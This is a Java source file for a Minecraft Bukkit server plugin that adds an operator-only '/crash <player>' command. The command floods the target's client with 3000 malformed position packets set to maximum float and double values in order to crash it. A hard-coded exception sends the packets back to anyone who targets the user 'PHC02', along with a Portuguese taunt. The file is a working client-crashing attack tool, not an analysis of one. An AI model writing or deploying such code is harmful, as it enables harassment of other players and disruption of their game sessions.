package com.ronaldophc.command;

import com.ronaldophc.helper.Util;
import net.minecraft.server.v1_8_R3.PacketPlayOutPosition;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.EnumSet;

public class Crash implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (cmd.getName().equalsIgnoreCase("crash")) {
            if (!(sender instanceof Player)) {
                sender.sendMessage(Util.noConsole);
                return true;
            }

            Player player = (Player) sender;
            if (!player.isOp()) {
                player.sendMessage(Util.noPermission);
                return true;
            }

            if (args.length != 1) {
                player.sendMessage(Util.usage("Usage: /crash <player>"));
                return true;
            }

            Player target = player.getServer().getPlayer(args[0]);
            if (target == null) {
                player.sendMessage("Player not found.");
                return true;
            }

            if (target.getName().equalsIgnoreCase("PHC02")) {
                player.sendMessage("VAI CRASHA A MAE.");
                for (int i = 0; i < 3000; i++) {
                    PacketPlayOutPosition packet = new PacketPlayOutPosition(
                            Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE, EnumSet.noneOf(PacketPlayOutPosition.EnumPlayerTeleportFlags.class));
                    ((CraftPlayer) player).getHandle().playerConnection.sendPacket(packet);
                }
                return true;
            }

            // Send a large number of position packets to the target player
            for (int i = 0; i < 3000; i++) {
                PacketPlayOutPosition packet = new PacketPlayOutPosition(
                        Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE, EnumSet.noneOf(PacketPlayOutPosition.EnumPlayerTeleportFlags.class));
                ((CraftPlayer) target).getHandle().playerConnection.sendPacket(packet);
            }

            player.sendMessage("Sent crash packets to " + target.getName());
            return true;
        }
        return true;
    }
}